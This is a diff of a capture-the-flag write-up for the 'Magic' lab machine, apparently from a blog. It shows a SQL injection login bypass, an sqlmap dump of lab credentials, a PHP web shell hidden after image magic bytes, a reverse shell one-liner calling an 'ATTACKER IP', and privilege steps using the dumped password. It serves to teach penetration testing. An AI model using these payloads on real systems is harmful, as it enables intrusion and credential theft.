@@ -101,7 +101,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">username=admin'</span><span class="w"> </span><span class="err">or</span><span class="w"> </span><span class="err">'=&amp;password=admin</span><span class="w">
 </span></code></pre></div></div>
 
-<p>Nice, looks like we have a different response. A redirection from the server <code class="language-plaintext highlighter-rouge">HTTP/1.1 302 Found</code>.</p>
+<p>Nice, looks like we have a different response. A <strong>redirection</strong> from the server <code class="language-plaintext highlighter-rouge">HTTP/1.1 302 Found</code>.</p>
 
 <p><img src="/assets/magic/4.png" alt="4" /></p>
 
@@ -112,9 +112,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>lets grab the login HTTP request from <strong>Repeater</strong> in <strong>Burp Suite</strong> and save to a file.</p>
 
 <p>start sqlmap tools with providing the following options:</p>
-<pre><code class="language-sqlmap">sqlmap -r r -p username --random-agent --level 3 --batch
+<pre><code class="language-sqlmap">sqlmap -r file --threads 10 --batch --risk 3 --level 5 --dump-all
 </code></pre>
-<p>while this is running, let get to the redirection part.</p>
+<p>while this is running, let get to the <strong>redirection</strong> part.</p>
 
 <p>following redirection leads us to a page where upload functionality exists.</p>
 
@@ -124,7 +124,125 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <p>It called “Magic Number” becuase, it reads the first 4 bytes of the file. Matching it with file extenstion to determine whether to accept or refuse based on the extension and file signature that the developer hardcoded in the application.</p>
 
-<p>Now lets try upload an image.</p>
+<p>Now lets try upload an image and look for the path of the uploaded image.</p>
+
+<p>…</p>
+
+<p>after uploading an image, i was able to see it in the landing page of the server.</p>
+
+<p><img src="/assets/magic/5.png" alt="5" /></p>
+
+<p>click on the image to enlarge it. Then right click and select “copy image location”</p>
+
+<p>my image resulted in this path: http://10.10.10.185/images/uploads/Mr9pvq9.png</p>
+
+<p>now lets redo the same steps we did, when tried to find <strong>SQLI</strong>. Grap the HTTP request in <strong>Burp Suite</strong> that uploads the image to the server, and send it to The repeater.</p>
+
+<p>playing with parameters to try to upload a shell on the server and attempt to executes by visiting the URL.</p>
+
+<p><img src="/assets/magic/6.png" alt="6" /></p>
+
+<p>chaning the extenstion to <code class="language-plaintext highlighter-rouge">.sh</code> isn’t working. But what about adding a single qoute again <code class="language-plaintext highlighter-rouge">'</code> then following it with <code class="language-plaintext highlighter-rouge">.png</code> ? what could possibley happen?</p>
+
+<p>lets praper right for exploitation. first we need to get a small good php shell, better if one liner.</p>
+
+<p>here is a good one made by <a href="https://github.com/KINGSABRI/WebShellConsole/blob/master/shells/shell.php">KingSabri</a></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?=</span><span class="sb">`$_GET[cmd]`</span><span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>we can execute commands by using this parameter <code class="language-plaintext highlighter-rouge">?cmd=</code></p>
+
+<p>now lets upload our image and stop at the request going to the server by burp.</p>
+
+<p><img src="/assets/magic/7.png" alt="7" /></p>
+
+<p>keep the first line in the red sqaure and delete the rest (the first line will be different in your case).</p>
+
+<p>by doing this, we keep the signature of the image file for the “Magic Number” to check.</p>
+
+<p>after the first line insert the following</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?=</span><span class="sb">`$_GET[cmd]`</span><span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>then the name of the file should be <code class="language-plaintext highlighter-rouge">a.php'.jpg</code>. the result should look like this..</p>
+
+<p><img src="/assets/magic/8.png" alt="8" /></p>
+
+<p>if we look at the response of this requst in burp, we find that the file has been uploaded with name <code class="language-plaintext highlighter-rouge">a.php'.jpg</code></p>
+
+<p><img src="/assets/magic/9.png" alt="9" /></p>
+
+<p>visiting the shell through this URL: 10.10.10.185/images/uploads/a.php’.jpg</p>
+
+<p>we see some gibberish characters, which is the first line we left from the image. however, append this <code class="language-plaintext highlighter-rouge">?cmd=whoami</code> to the end of the url –&gt; 10.10.10.185/images/uploads/a.php’.jpg?cmd=whoami</p>
+
+<p>we can see that the user is <strong>www-data</strong>.</p>
+
+<p>now lets look at sqlmap result then we get back to getting a reverse shell.</p>
+
+<pre><code class="language-sqlmap">Database: Magic
+Table: login
+[1 entry]
++----+----------+----------------+
+| id | username | password       |
++----+----------+----------------+
+| 1  | admin    | Th3s3usW4sK1ng |
++----+----------+----------------+
+
+... (screen was diplected)
+
+
+Database: information_schema
+Table: USER_PRIVILEGES
+[1 entry]
++-----------------------+--------------+---------------+----------------+
+| GRANTEE               | IS_GRANTABLE | TABLE_CATALOG | PRIVILEGE_TYPE |
++-----------------------+--------------+---------------+----------------+
+| 'theseus'@'localhost' | NO           | def           | USAGE          |
++-----------------------+--------------+---------------+----------------+
+
+
+</code></pre>
+<p>cool, it looks like we have some creds here and a username of the host.</p>
+
+<p>trying ssh to the box</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">The authenticity of host '10.10.10.185 (10.10.10.185)' cant be established.
+ECDSA key fingerprint is SHA256:yx0Y6af8RGpG0bHr1AQtS+06uDomn1MMZVzpNaHEv0A.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.185' (ECDSA) to the list of known hosts.
+theseus@10.10.10.185: Permission denied (publickey).
+</span></code></pre></div></div>
+
+<p>bad luck. our machine must be in the authorized_host file in order to get ssh connection.</p>
+
+<p>good thing is that we have a shell we upload it to the server.</p>
+
+<p>visiting the url: 10.10.10.185/images/uploads/a.php’.jpg?cmd=whoami</p>
+
+<p>we get a result of 404 not found ?</p>
+
+<p>there must be somehting that deletes our uplaoded files.</p>
+
+<p>lets redo the steps for uploading a shell and this time lets use this command</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php <span class="nt">-r</span> <span class="s1">'$sock%3dfsockopen("ATTACKER IP",1234)%3bexec("/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263")%3b'</span>
+</code></pre></div></div>
+
+<p>and listen to on port 1234 with netcat.</p>
+
+<p>good, we have a shell. first thing, upgrading our shell is always a good habit.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+<p>second lets make use of the previous creds that were colleteced.</p>
+
+<pre><code class="language-xterm">su - theseus
+</code></pre>
+
+<p>and supply ‘theseus’ the password that was found in the database ‘Th3s3usW4sK1ng’</p>
+
+<p>solid, now we have compromised theseus account. lets run linux enumeration scripts like <a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum.sh</a></p>
+
 
 </div>
 
